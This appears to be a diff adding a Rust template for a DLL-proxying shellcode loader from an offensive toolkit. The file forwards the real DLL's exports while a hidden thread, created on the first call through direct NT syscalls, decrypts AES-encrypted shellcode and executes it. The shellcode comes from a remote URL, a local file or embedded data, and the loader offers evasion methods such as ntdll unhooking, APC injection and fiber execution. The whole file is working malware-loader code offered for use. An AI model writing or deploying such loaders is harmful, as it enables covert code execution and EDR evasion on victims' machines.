@@ -1,0 +1,159 @@
+use dinvoke_rs::data::PVOID;
+use lazy_static::lazy_static;
+use std::sync::{Arc, Mutex};
+use std::{ptr, thread};
+use winapi::um::handleapi::CloseHandle;
+use winapi::um::synchapi::WaitForSingleObject;
+use winapi::um::winbase::INFINITE;
+use windows::Win32::Foundation::HANDLE;
+
+const NATIVE: bool = {NATIVE};
+const DLL_NAME: &str = r"{DLL_NAME}";
+static mut ADDRESS: usize = 0;
+lazy_static! {
+    static ref MUTEX: Arc<Mutex<i32>> = Arc::new(Mutex::new(0));
+}
+
+fn gateway(arg1:u64, arg2:u64, arg3:u64, arg4:u64, arg5:u64, arg6:u64, arg7:u64, arg8:u64, arg9:u64, arg10:u64, arg11:u64, arg12:u64, arg13:u64, arg14:u64, arg15:u64, arg16:u64, arg17:u64, arg18:u64, arg19:u64, arg20:u64, index: u32) -> u64 
+{
+    let flag = Arc::clone(&MUTEX);
+    let mut flag = flag.lock().unwrap(); 
+      if *flag == 0 {
+        *flag += 1;
+        if NATIVE {
+            unsafe {
+                let h = HANDLE::default();
+                let handle: *mut HANDLE = std::mem::transmute(&h);
+                let phand = HANDLE(-1);
+                let thread_start_address = payload_execution as *const ();
+                let start_routine: PVOID = std::mem::transmute(thread_start_address);
+                let ret = dinvoke_rs::dinvoke::nt_create_thread_ex(
+                    handle,
+                    0x1FFFFF,
+                    ptr::null_mut(),
+                    phand,
+                    start_routine,
+                    ptr::null_mut(),
+                    0,
+                    0,
+                    0,
+                    0,
+                    ptr::null_mut(),
+                );
+
+                if ret == 0 {
+                    let raw_handle = (*handle).0; // Get the underlying integer value
+                    WaitForSingleObject(raw_handle as _, INFINITE);
+                    CloseHandle(raw_handle as _);
+                } else {
+                    let thread = thread::spawn(|| {
+                        payload_execution();
+                    });
+                    thread.join().unwrap();
+                }
+            }
+        }  else {
+            let thread = thread::spawn(|| {
+                payload_execution();
+            });
+            thread.join().unwrap();
+        }
+  }
+
+    
+    unsafe
+    {
+        if ADDRESS != 0
+        {
+            let func: extern "system" fn (u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64) -> u64 = std::mem::transmute(ADDRESS);
+            let ret = func(arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8,arg9,arg10,arg11,arg12,arg13,arg14,arg15,arg16,arg17,arg18,arg19,arg20);
+            return ret;
+        }   
+    }
+
+    let func_name = match index {
+{MATCH_STATEMENT}
+        _ => "".to_string(),
+    };
+
+    if func_name.is_empty() {
+        return 0;
+    }
+
+    let dll_address = dinvoke_rs::dinvoke::load_library_a(DLL_NAME);
+    if dll_address == 0 {
+        return 0;
+    }
+
+    let func_address = dinvoke_rs::dinvoke::get_function_address(dll_address, &func_name);
+    if func_address == 0 {
+        return 0;
+    }
+    
+    unsafe
+    {
+        ADDRESS = func_address;
+        let func: extern "system" fn (u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64) -> u64 = std::mem::transmute(ADDRESS);
+        let ret = func(arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8,arg9,arg10,arg11,arg12,arg13,arg14,arg15,arg16,arg17,arg18,arg19,arg20);
+        return ret;
+    }
+}
+
+use std::ffi::{{c_char, CString}};
+use reqwest::blocking::Client;
+
+#[repr(C)]
+pub struct DecryptResult {
+    pub data_ptr: *mut u8,
+    pub data_len: usize,
+}
+
+#[link(name = "init", kind = "static")]
+extern "C" {
+    pub fn start_app(
+        init_config: *const u8,
+        init_config_len: usize,
+        ct: *const u8,
+        ct_len: usize,
+        key: *const u8,
+        key_len: usize,
+        iv: *const u8,
+        iv_len: usize,
+    ) -> DecryptResult;
+    pub fn ntdll_unhook_loader_run(code: *const u8, code_len: usize);
+    pub fn heapapi_dynamic_loader_run(code: *const u8, code_len: usize);
+    pub fn nt_queue_apc_thread_ex_local_run(code: *const u8, code_len: usize);
+    pub fn create_fiber_run(code: *const u8, code_len: usize);
+    pub fn memmap2_transmute_run(code: *const u8, code_len: usize);
+    pub fn get_remote_bin(url: *const c_char, out_len: *mut usize) -> *mut u8;
+    }
+
+fn payload_execution() {
+    
+        unsafe {
+  
+            const AES_KEY: [u8; 16] = {AES_KEY};
+            const AES_IV: [u8; 16] = {AES_IV};
+            #[cfg(feature = "remote")]
+            let CT = get_data_from_url("{REMOTE_URL}"); 
+            #[cfg(feature = "separate")]
+            let CT = read_file("{LOCAL_FILE}");
+            #[cfg(not(any(feature = "separate", feature = "remote")))]
+            const CT: &'static [u8] = include_bytes!("../../config.dat");
+            let init_config = b"{INIT_CONFIG}";           
+            let pt = start_app(
+                init_config.as_ptr(),
+                init_config.len(),
+                CT.as_ptr(),
+                CT.len(),
+                AES_KEY.as_ptr(),
+                AES_KEY.len(),
+                AES_IV.as_ptr(),
+                AES_IV.len(),
+            );
+            std::thread::sleep(std::time::Duration::from_millis(100));
+            {LOAD_METHOD}_run(pt.data_ptr, pt.data_len);
+        }
+    
+}
+
